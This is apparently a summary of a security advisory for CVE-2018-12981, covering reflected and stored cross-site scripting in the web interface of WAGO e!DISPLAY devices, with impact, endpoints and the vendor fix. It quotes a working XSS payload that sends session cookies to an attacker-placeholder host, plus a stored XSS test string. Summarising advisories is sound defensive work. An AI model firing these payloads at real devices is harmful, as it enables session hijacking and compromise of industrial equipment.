Based on the provided content, here's a breakdown of the vulnerabilities associated with CVE-2018-12981:

**Root Cause:**

*   **Insufficient Sanitization:** The primary cause is the lack of proper sanitization of user-supplied input, specifically within the JSON parameters sent to the WAGO e!DISPLAY device's web interface through multiple PHP scripts.

**Weaknesses/Vulnerabilities:**

1.  **Reflected Cross-Site Scripting (XSS):**
    *   Multiple PHP scripts in the admin interface are vulnerable to reflected XSS.
    *   The `JSON` input is not sanitized, allowing injection of malicious scripts.
    *   This affects both authenticated and unauthenticated users.
2.  **Stored Cross-Site Scripting (XSS):**
    *   The "PLC List" configuration in the web interface is vulnerable to stored XSS.
    *   Malicious payloads can be stored within the PLC names and be executed when viewed by users.
    *   This vulnerability is only present for authenticated users.

**Impact of Exploitation:**

*   **Arbitrary Script Execution:** Attackers can inject and execute arbitrary JavaScript code within the context of the user's browser.
*   **Session Hijacking:** By stealing session cookies, an attacker can gain control of the user's active session.
*   **Remote Code Execution:** When combined with other vulnerabilities, an attacker can achieve remote code execution on the device as the 'www' user.
*   **Full Compromise:** The combination of vulnerabilities allows an attacker to upload malicious code to the device and overwrite existing files, leading to potential full compromise of the system.

**Attack Vectors:**

*   **Reflected XSS:** The attacker crafts a malicious URL or request containing XSS payloads. The user is tricked into sending this request to the device which then reflects the malicious script, executing it in the user's browser.
*   **Stored XSS:** The attacker injects malicious scripts into the "PLC List" via the web interface. These scripts are then executed whenever a user accesses the "PLC List".

**Required Attacker Capabilities/Position:**

*   **Reflected XSS:**
    *   The attacker needs to trick a user into accessing a malicious URL or submitting a crafted POST request containing the malicious XSS payload.
    *   No authentication is required initially to inject the XSS, but gaining access to the session requires user interaction.
*   **Stored XSS:**
    *   The attacker requires a valid authenticated session to modify the "PLC List."
    *   No further user interaction is required once the malicious script is stored.

**Technical Details:**

*   **Affected Endpoints (Reflected XSS):**
    *   `/wbm/configtools.php`
    *   `/wbm/login.php`
    *   `/wbm/receive_upload.php`
*   **Example Reflected XSS payload:**
    *   The payload `{"sessionId":"","aDeviceParams":{"0":{"name":"firewall","parameter":["iptables","--get-xml"],"sudo":true,"multiline":true,"timeout":10000},"1":{"name":"firewall","parameter":["firewall","--is-enabled"],"sudo":true,"multiline":true,"timeout":10000,"dataId":"{DoNotParseAsXml}<img src=x onerror=this.src='http://$attacker:8001/?c='+document.cookie>;"}}}` within the POST request to `/wbm/configtools.php` demonstrates how to inject JavaScript.
*   **Example Stored XSS payload:**
    *   `<img src=a onerror=alert('SEC_Consult_XSS');alert(document.cookie)>` in the "Text" field of the PLC configuration.

**Additional Information:**

*   The provided content shows that CVE-2018-12981 is part of a larger set of vulnerabilities (CVE-2018-12979, CVE-2018-12980) affecting WAGO e!DISPLAY devices.
*   The vulnerabilities can be combined to achieve remote code execution. This involves exploiting XSS, unrestricted file upload, file path manipulation, and incorrect default permissions.
*   The vendor's recommended solution is to update to firmware version FW 02, and to restrict network access to the device.
